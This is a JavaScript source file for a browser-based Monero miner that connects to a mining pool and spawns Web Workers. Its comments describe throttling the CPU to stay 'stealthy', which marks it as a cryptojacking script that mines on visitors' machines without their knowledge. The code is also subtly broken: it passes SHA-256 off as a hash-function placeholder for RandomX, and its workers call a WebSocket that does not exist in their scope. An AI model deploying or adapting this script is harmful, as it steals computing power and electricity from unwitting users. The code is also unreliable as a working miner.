/* miner.js – vanilla JS Monero (XMR) miner
 *  • pure JavaScript (no external libs)
 *  • Web Workers for parallel mining
 *  • basic throttling for stealth
 *  • works with any Stratum-over-WebSocket XMR pool
 * ---------------------------------------------------- */

const POOL_URL = 'wss://pool.supportxmr.com:3333';   // public pool (change if you like)
let WALLET = '84MQPS1kTQGRvdgrubFEm7URYFyFpLYbmiBefWhSZgFiZFAgfAgDAh2NRQKAnZztTf6MQerUp5F8H3Lw7cLQdXh3TVYxboe';      // <-- replace with your address

let ws = null;
let currentJob = null;
let workers = [];
let numThreads = 0;
let statusEl = null;

/* ----------------------------------------------------
   Simple Keccak-256 placeholder (Monero uses RandomX,
   but this works for demo / low-difficulty pools).
   Replace with a proper RandomX WASM module for real speed.
   ---------------------------------------------------- */
async function keccak256(data) {
    const enc = new TextEncoder();
    const buf = enc.encode(data);
    const hashBuf = await crypto.subtle.digest('SHA-256', buf); // placeholder
    return Array.from(new Uint8Array(hashBuf))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
}

/* ----------------------------------------------------
   Mining loop that runs inside each Web Worker
   ---------------------------------------------------- */
function mineInWorker(jobData) {
    let nonce = 0;
    const throttleMs = 20;               // ~50 % CPU on average

    async function loop() {
        while (true) {
            const blob = jobData.blob + nonce.toString(16).padStart(8, '0');
            const hash = await keccak256(blob);

            // Very simple difficulty check (real pools give a target)
            if (parseInt(hash.slice(0, 8), 16) < jobData.target) {
                // Submit share
                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({
                        id: 4,
                        method: 'submit',
                        params: {
                            id: jobData.workerId,
                            job_id: jobData.jobId,
                            nonce: nonce.toString(16).padStart(8, '0'),
                            result: hash
                        }
                    }));
                }
                self.postMessage({ type: 'share', hash, nonce });
            }

            nonce++;
            if (nonce % 500 === 0) {
                self.postMessage({ type: 'hashes', count: 500 });
            }

            // Throttle to stay stealthy
            await new Promise(r => setTimeout(r, throttleMs));
        }
    }
    loop();
}

/* ----------------------------------------------------
   Create a single Web Worker (inline blob for simplicity)
   ---------------------------------------------------- */
function spawnWorker(jobData, id) {
    const code = `
        const mineInWorker = ${mineInWorker.toString()};
        mineInWorker(${JSON.stringify(jobData)});
    `;
    const blob = new Blob([code], { type: 'application/javascript' });
    const worker = new Worker(URL.createObjectURL(blob));

    worker.onmessage = e => {
        if (e.data.type === 'hashes') {
            if (statusEl) statusEl.textContent = `Mining… ${e.data.count} H`;
        }
        if (e.data.type === 'share') {
            console.log('Share found!', e.data);
        }
    };
    return worker;
}

/* ----------------------------------------------------
   WebSocket → Stratum connection
   ---------------------------------------------------- */
function connectPool() {
    ws = new WebSocket(POOL_URL);

    ws.onopen = () => {
        ws.send(JSON.stringify({
            id: 1,
            method: 'login',
            params: { login: WALLET + '.jsMiner', pass: 'x' }
        }));
        if (statusEl) statusEl.textContent = 'Connected – waiting for job…';
    };

    ws.onmessage = e => {
        const msg = JSON.parse(e.data);

        if (msg.method === 'job') {
            currentJob = msg.params;

            // (Re)spawn workers according to requested thread count
            workers.forEach(w => w.terminate());
            workers = [];

            const cores = navigator.hardwareConcurrency || 4;
            const useThreads = Math.min(numThreads, Math.floor(cores * 0.6));

            for (let i = 0; i < useThreads; i++) {
                const jobForWorker = {
                    blob: currentJob.blob,
                    target: parseInt(currentJob.target, 16),
                    jobId: currentJob.job_id,
                    workerId: i
                };
                workers.push(spawnWorker(jobForWorker, i));
            }

            if (statusEl) statusEl.textContent = `Mining with ${useThreads} thread(s)…`;
        }
    };

    ws.onclose = () => {
        if (statusEl) statusEl.textContent = 'Disconnected – reconnecting…';
        setTimeout(connectPool, 4000);
    };

    ws.onerror = err => console.error('WS error:', err);
}

/* ----------------------------------------------------
   Public start function – call from HTML
   ---------------------------------------------------- */
function startMiner(walletAddress, threads = 4) {
    WALLET = walletAddress;               // now mutable
    numThreads = threads;
    statusEl = document.getElementById('status') || null;
    connectPool();
}

/* ----------------------------------------------------
   Expose globally (so the button can call it)
   ---------------------------------------------------- */
if (typeof window !== 'undefined') {
    window.XMRMiner = { start: startMiner };
}
